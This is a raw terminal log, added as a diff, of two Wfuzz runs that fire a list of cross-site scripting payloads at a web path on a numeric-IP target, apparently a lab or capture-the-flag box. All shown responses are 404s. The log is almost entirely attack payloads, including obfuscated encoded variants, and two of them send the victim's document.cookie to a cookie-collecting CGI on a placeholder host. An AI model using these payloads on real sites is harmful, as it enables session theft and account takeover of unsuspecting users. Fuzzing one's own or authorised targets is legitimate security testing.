@@ -1,0 +1,122 @@
+********************************************************
+* Wfuzz 3.0.1 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://138.68.182.108:31068/index.php/FUZZ
+Total requests: 39
+
+===================================================================
+ID        [0m   Response[0m   Lines [0m   Word  [0m   Chars    [0m   Payload                                          [0m
+===================================================================
+
+000000003:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<<script>alert("WXSS");//<</script>"            [0m
+[0K[1A[0K000000007:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "\";alert('XSS');//"                             [0m
+[0K[1A[0K000000008:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "%3cscript%3ealert("WXSS");%3c/script%3e"        [0m
+[0K[1A[0K000000002:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<script>alert("WXSS")</script>"                 [0m
+[0K[1A[0K000000010:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E"  [0m
+[0K[1A[0K000000006:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "'><script>alert(document.cookie);</script>"     [0m
+[0K[1A[0K000000004:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<script>alert(document.cookie)</script>"        [0m
+[0K[1A[0K000000001:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   ""><script>""                                    [0m
+[0K[1A[0K000000009:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "%3cscript%3ealert(document.cookie);%3c%2fscript%[0m
+          [0m           [0m         [0m         [0m            [0m   3e"                                              [0m
+[0K[1A[0K[1A[0K000000005:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "'><script>alert(document.cookie)</script>"      [0m
+[0K[1A[0K000000013:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<xss><script>alert('WXSS')</script></vulnerable>[0m
+          [0m           [0m         [0m         [0m            [0m   "                                                [0m
+[0K[1A[0K[1A[0K000000011:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "&ltscript&gtalert(document.cookie);</script>"   [0m
+[0K[1A[0K000000022:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<IMG%20SRC=javascript:alert(String.fromCharCode([0m
+          [0m           [0m         [0m         [0m            [0m   88,83,83))>"                                     [0m
+[0K[1A[0K[1A[0K000000017:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<IMG%20SRC=javascript:alert('WXSS')>"           [0m
+[0K[1A[0K000000021:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<IMG%20"""><SCRIPT>alert("WXSS")</SCRIPT>">"    [0m
+[0K[1A[0K000000020:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<IMG%20SRC=`javascript:alert("'WXSS'")`>"       [0m
+[0K[1A[0K000000018:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<IMG%20SRC=JaVaScRiPt:alert('WXSS')>"           [0m
+[0K[1A[0K000000019:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<IMG%20SRC=javascript:alert(&quot;WXSS&quot;)>" [0m
+[0K[1A[0K000000015:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<IMG%20SRC="javascript:alert('WXSS');">"        [0m
+[0K[1A[0K000000016:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<IMG%20SRC="javascript:alert('WXSS')""          [0m
+[0K[1A[0K000000012:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "&ltscript&gtalert(document.cookie);&ltscript&gta[0m
+          [0m           [0m         [0m         [0m            [0m   lert"                                            [0m
+[0K[1A[0K[1A[0K000000014:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<IMG%20SRC='javascript:alert(document.cookie)'>"[0m
+[0K[1A[0K000000025:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<IMG%20SRC="jav&#x09;ascript:alert('WXSS');">"  [0m
+[0K[1A[0K000000029:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<IMG%20DYNSRC="javascript:alert('WXSS')">"      [0m
+[0K[1A[0K000000028:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<IMG%20SRC="%20&#14;%20javascript:alert('WXSS');[0m
+          [0m           [0m         [0m         [0m            [0m   ">"                                              [0m
+[0K[1A[0K[1A[0K000000034:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<IMG%20SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#[0m
+          [0m           [0m         [0m         [0m            [0m   x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&[0m
+          [0m           [0m         [0m         [0m            [0m   #x27&#x58&#x53&#x53&#x27&#x29>"                  [0m
+[0K[1A[0K[1A[0K[1A[0K000000037:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%[0m
+          [0m           [0m         [0m         [0m            [0m   3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2E[0m
+          [0m           [0m         [0m         [0m            [0m   cgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E" [0m
+[0K[1A[0K[1A[0K[1A[0K000000039:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "'';!--"<XSS>=&{()}"                             [0m
+[0K[1A[0K000000038:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "';alert(String.fromCharCode(88,83,83))//\';alert[0m
+          [0m           [0m         [0m         [0m            [0m   (String.fromCharCode(88,83,83))//";alert(String.f[0m
+          [0m           [0m         [0m         [0m            [0m   romCharCode(88,83,83))//\";alert(String.fromCharC[0m
+          [0m           [0m         [0m         [0m            [0m   ode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String[0m
+          [0m           [0m         [0m         [0m            [0m   .fromCharCode(88,83,83))</SCRIPT>=&{}"           [0m
+[0K[1A[0K[1A[0K[1A[0K[1A[0K[1A[0K000000036:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   ""><script>document.location='http://cookieSteale[0m
+          [0m           [0m         [0m         [0m            [0m   r/cgi-bin/cookie.cgi?'+document.cookie</script>" [0m
+[0K[1A[0K[1A[0K
+Total time: 0
+Processed Requests: 30
+Filtered Requests: 30
+Requests/sec.: 0
+
+********************************************************
+* Wfuzz 3.0.1 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://138.68.182.108:31068/index.php/FUZZ
+Total requests: 39
+
+===================================================================
+ID        [0m   Response[0m   Lines [0m   Word  [0m   Chars    [0m   Payload                                          [0m
+===================================================================
+
+000000005:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "'><script>alert(document.cookie)</script>"      [0m
+[0K[1A[0K000000001:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   ""><script>""                                    [0m
+[0K[1A[0K000000006:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "'><script>alert(document.cookie);</script>"     [0m
+[0K[1A[0K000000008:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "%3cscript%3ealert("WXSS");%3c/script%3e"        [0m
+[0K[1A[0K000000007:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "\";alert('XSS');//"                             [0m
+[0K[1A[0K000000002:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<script>alert("WXSS")</script>"                 [0m
+[0K[1A[0K000000003:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<<script>alert("WXSS");//<</script>"            [0m
+[0K[1A[0K000000004:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<script>alert(document.cookie)</script>"        [0m
+[0K[1A[0K000000010:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E"  [0m
+[0K[1A[0K000000009:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "%3cscript%3ealert(document.cookie);%3c%2fscript%[0m
+          [0m           [0m         [0m         [0m            [0m   3e"                                              [0m
+[0K[1A[0K[1A[0K000000016:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<IMG%20SRC="javascript:alert('WXSS')""          [0m
+[0K[1A[0K000000012:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "&ltscript&gtalert(document.cookie);&ltscript&gta[0m
+          [0m           [0m         [0m         [0m            [0m   lert"                                            [0m
+[0K[1A[0K[1A[0K000000019:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<IMG%20SRC=javascript:alert(&quot;WXSS&quot;)>" [0m
+[0K[1A[0K000000015:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<IMG%20SRC="javascript:alert('WXSS');">"        [0m
+[0K[1A[0K000000018:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<IMG%20SRC=JaVaScRiPt:alert('WXSS')>"           [0m
+[0K[1A[0K000000017:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<IMG%20SRC=javascript:alert('WXSS')>"           [0m
+[0K[1A[0K000000022:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<IMG%20SRC=javascript:alert(String.fromCharCode([0m
+          [0m           [0m         [0m         [0m            [0m   88,83,83))>"                                     [0m
+[0K[1A[0K[1A[0K000000020:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<IMG%20SRC=`javascript:alert("'WXSS'")`>"       [0m
+[0K[1A[0K000000021:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<IMG%20"""><SCRIPT>alert("WXSS")</SCRIPT>">"    [0m
+[0K[1A[0K000000014:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<IMG%20SRC='javascript:alert(document.cookie)'>"[0m
+[0K[1A[0K000000013:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<xss><script>alert('WXSS')</script></vulnerable>[0m
+          [0m           [0m         [0m         [0m            [0m   "                                                [0m
+[0K[1A[0K[1A[0K000000011:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "&ltscript&gtalert(document.cookie);</script>"   [0m
+[0K[1A[0K000000032:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<IMG%20SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#11[0m
+          [0m           [0m         [0m         [0m            [0m   4;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&[0m
+          [0m           [0m         [0m         [0m            [0m   #116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>"       [0m
+[0K[1A[0K[1A[0K[1A[0K000000025:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<IMG%20SRC="jav&#x09;ascript:alert('WXSS');">"  [0m
+[0K[1A[0K000000035:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)[0m
+          [0m           [0m         [0m         [0m            [0m   %3E%3C/IFRAME%3E"                                [0m
+[0K[1A[0K[1A[0K000000034:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<IMG%20SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#[0m
+          [0m           [0m         [0m         [0m            [0m   x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&[0m
+          [0m           [0m         [0m         [0m            [0m   #x27&#x58&#x53&#x53&#x27&#x29>"                  [0m
+[0K[1A[0K[1A[0K[1A[0K000000031:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26[0m
+          [0m           [0m         [0m         [0m            [0m   %23x6c;ert(document.%26%23x63;ookie)'>"          [0m
+[0K[1A[0K[1A[0K000000033:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<IMG%20SRC=&#0000106&#0000097&#0000118&#0000097&[0m
+          [0m           [0m         [0m         [0m            [0m   #0000115&#0000099&#0000114&#0000105&#0000112&#000[0m
+          [0m           [0m         [0m         [0m            [0m   0116&#0000058&#0000097&#0000108&#0000101&#0000114[0m
+          [0m           [0m         [0m         [0m            [0m   &#0000116&#0000040&#0000039&#0000088&#0000083&#00[0m
+          [0m           [0m         [0m         [0m            [0m   00083&#0000039&#0000041>"                        [0m
+[0K[1A[0K[1A[0K[1A[0K[1A[0K[1A[0K000000028:[0m   404     [0m   7 L   [0m   11 W  [0m   146 Ch   [0m   "<IMG%20SRC="%20&#14;%20javascript:alert('WXSS');[0m
+          [0m           [0m         [0m         [0m            [0m   ">"                                              [0m
+[0K[1A[0K[1A[0K
+Total time: 0
+Processed Requests: 27
+Filtered Requests: 27
+Requests/sec.: 0
+
